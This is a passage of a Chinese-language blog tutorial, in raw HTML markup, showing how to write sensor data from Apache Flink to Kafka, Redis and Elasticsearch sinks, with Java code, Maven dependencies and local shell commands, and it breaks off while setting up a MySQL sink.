class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer-group&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从Kafka中读取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.addSource( <span class="keyword">new</span> FlinkKafkaConsumer&lt;String&gt;(<span class="string">&quot;sensor&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(), properties));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化从Kafka中读取的数据</span></span><br><span class="line">        DataStream&lt;String&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>])).toString();</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将数据写入Kafka</span></span><br><span class="line">        dataStream.addSink( <span class="keyword">new</span> FlinkKafkaProducer&lt;String&gt;(<span class="string">&quot;localhost:9092&quot;</span>, <span class="string">&quot;sinktest&quot;</span>, <span class="keyword">new</span> SimpleStringSchema()));</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 启动kafka服务  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> 新建kafka生产者console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic sensor</span></span><br></pre></td></tr></table></figure></li><li><p> 新建kafka消费者console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic sinktest</span></span><br></pre></td></tr></table></figure></li><li><p> 运行Flink程序，在kafka生产者console输入数据，查看kafka消费者console的输出结果<br>输入(kafka生产者console)<br>输出(kafka消费者console)  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_1,1547718199,35.8</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">sensor_6,1547718201,15.4</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SensorReading&#123;id=&#x27;sensor_1&#x27;, timestamp=1547718199, temperature=35.8&#125;</span><br><span class="line">SensorReading&#123;id=&#x27;sensor_6&#x27;, timestamp=1547718201, temperature=15.4&#125;</span><br></pre></td></tr></table></figure></li></ol><p>这里Flink的作用相当于pipeline了。</p><h5 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h5><blockquote><p><a href="https://mvnrepository.com/search?q=flink-connector-redis">flink-connector-redis</a></p><p>查询Flink连接器，最简单的就是查询关键字<code>flink-connector-</code></p></blockquote><p>这里将Redis当作sink的输出对象。</p><ol><li><p> pom依赖<br>这个可谓相当老的依赖了，2017年的。  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.bahir/flink-connector-redis --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.bahir<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-redis_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.RedisSink;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.config.FlinkJedisPoolConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisCommand;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisCommandDescription;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.redis.common.mapper.RedisMapper;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 1:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest2_Redis</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件读取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义jedis连接配置(我这里连接的是docker的redis)</span></span><br><span class="line">        FlinkJedisPoolConfig config = <span class="keyword">new</span> FlinkJedisPoolConfig.Builder()</span><br><span class="line">                .setHost(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line">                .setPort(<span class="number">6379</span>)</span><br><span class="line">                .setPassword(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">                .setDatabase(<span class="number">0</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        dataStream.addSink(<span class="keyword">new</span> RedisSink&lt;&gt;(config, <span class="keyword">new</span> MyRedisMapper()));</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义RedisMapper</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRedisMapper</span> <span class="keyword">implements</span> <span class="title">RedisMapper</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">// 定义保存数据到redis的命令，存成Hash表，hset sensor_temp id temperature</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> RedisCommandDescription <span class="title">getCommandDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RedisCommandDescription(RedisCommand.HSET, <span class="string">&quot;sensor_temp&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getKeyFromData</span><span class="params">(SensorReading data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> data.getId();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getValueFromData</span><span class="params">(SensorReading data)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> data.getTemperature().toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动redis服务（我这里是docker里的） </p></li><li><p> 启动Flink程序 </p></li><li><p> 查看Redis里的数据<br><em>因为最新数据覆盖前面的，所以最后redis里呈现的是最新的数据。</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">localhost:0&gt;hgetall sensor_temp</span><br><span class="line">1) &quot;sensor_1&quot;</span><br><span class="line">2) &quot;37.1&quot;</span><br><span class="line">3) &quot;sensor_6&quot;</span><br><span class="line">4) &quot;15.4&quot;</span><br><span class="line">5) &quot;sensor_7&quot;</span><br><span class="line">6) &quot;6.7&quot;</span><br><span class="line">7) &quot;sensor_10&quot;</span><br><span class="line">8) &quot;38.1&quot;</span><br></pre></td></tr></table></figure></li></ol><h5 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h5><blockquote><p><a href="https://blog.csdn.net/weixin_42066446/article/details/113243977">Flink 1.12.1 ElasticSearch连接 Sink</a></p></blockquote><ol><li><p> pom依赖  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ElasticSearch7 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-elasticsearch7_2.12<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RuntimeContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch.ElasticsearchSinkFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch.RequestIndexer;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.connectors.elasticsearch7.ElasticsearchSink;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpHost;</span><br><span class="line"><span class="keyword">import</span> org.elasticsearch.action.index.IndexRequest;</span><br><span class="line"><span class="keyword">import</span> org.elasticsearch.client.Requests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 2:13 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest3_Es</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件读取数据</span></span><br><span class="line">        DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换成SensorReading类型</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">            String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义es的连接配置</span></span><br><span class="line">        List&lt;HttpHost&gt; httpHosts = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        httpHosts.add(<span class="keyword">new</span> HttpHost(<span class="string">&quot;localhost&quot;</span>, <span class="number">9200</span>));</span><br><span class="line"></span><br><span class="line">        dataStream.addSink( <span class="keyword">new</span> ElasticsearchSink.Builder&lt;SensorReading&gt;(httpHosts, <span class="keyword">new</span> MyEsSinkFunction()).build());</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现自定义的ES写入操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyEsSinkFunction</span> <span class="keyword">implements</span> <span class="title">ElasticsearchSinkFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(SensorReading element, RuntimeContext ctx, RequestIndexer indexer)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 定义写入的数据source</span></span><br><span class="line">            HashMap&lt;String, String&gt; dataSource = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            dataSource.put(<span class="string">&quot;id&quot;</span>, element.getId());</span><br><span class="line">            dataSource.put(<span class="string">&quot;temp&quot;</span>, element.getTemperature().toString());</span><br><span class="line">            dataSource.put(<span class="string">&quot;ts&quot;</span>, element.getTimestamp().toString());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建请求，作为向es发起的写入命令(ES7统一type就是_doc，不再允许指定type)</span></span><br><span class="line">            IndexRequest indexRequest = Requests.indexRequest()</span><br><span class="line">                    .index(<span class="string">&quot;sensor&quot;</span>)</span><br><span class="line">                    .source(dataSource);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 用index发送请求</span></span><br><span class="line">            indexer.add(indexRequest);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 启动ElasticSearch（我这里是docker启动的 </p></li><li><p> 运行Flink程序，查看ElasticSearch是否新增数据  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl <span class="string">&quot;localhost:9200/sensor/_search?pretty&quot;</span></span></span><br><span class="line">&#123;</span><br><span class="line">  &quot;took&quot; : 1,</span><br><span class="line">  &quot;timed_out&quot; : false,</span><br><span class="line">  &quot;_shards&quot; : &#123;</span><br><span class="line">    &quot;total&quot; : 1,</span><br><span class="line">    &quot;successful&quot; : 1,</span><br><span class="line">    &quot;skipped&quot; : 0,</span><br><span class="line">    &quot;failed&quot; : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;hits&quot; : &#123;</span><br><span class="line">    &quot;total&quot; : &#123;</span><br><span class="line">      &quot;value&quot; : 7,</span><br><span class="line">      &quot;relation&quot; : &quot;eq&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;max_score&quot; : 1.0,</span><br><span class="line">    &quot;hits&quot; : [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;jciyWXcBiXrGJa12kSQt&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;35.8&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718199&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;jsiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;15.4&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_6&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718201&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;j8iyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;6.7&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_7&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718202&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;kMiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;38.1&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_10&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718205&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;kciyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;36.3&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718207&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;ksiyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;32.8&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718209&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;_index&quot; : &quot;sensor&quot;,</span><br><span class="line">        &quot;_type&quot; : &quot;_doc&quot;,</span><br><span class="line">        &quot;_id&quot; : &quot;k8iyWXcBiXrGJa12kSQu&quot;,</span><br><span class="line">        &quot;_score&quot; : 1.0,</span><br><span class="line">        &quot;_source&quot; : &#123;</span><br><span class="line">          &quot;temp&quot; : &quot;37.1&quot;,</span><br><span class="line">          &quot;id&quot; : &quot;sensor_1&quot;,</span><br><span class="line">          &quot;ts&quot; : &quot;1547718212&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h5 id="JDBC自定义sink"><a href="#JDBC自定义sink" class="headerlink" title="JDBC自定义sink"></a>JDBC自定义sink</h5><blockquote><p><a href="https://www.cnblogs.com/ywjfx/p/14263718.html">Flink之Mysql数据CDC</a></p><p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/connectors/jdbc.html">JDBC Connector</a>    &lt;=    官方目前没有专门针对MySQL的，我们自己实现就好了</p></blockquote><p>这里测试的是连接MySQL。</p><ol><li><p> pom依赖（我本地docker里的mysql是8.0.19版本的）  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> 启动mysql服务（我本地是docker启动的） </p></li><li><p> 新建数据库  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE `flink_test` <span class="keyword">DEFAULT</span> <span class="type">CHARACTER</span> <span 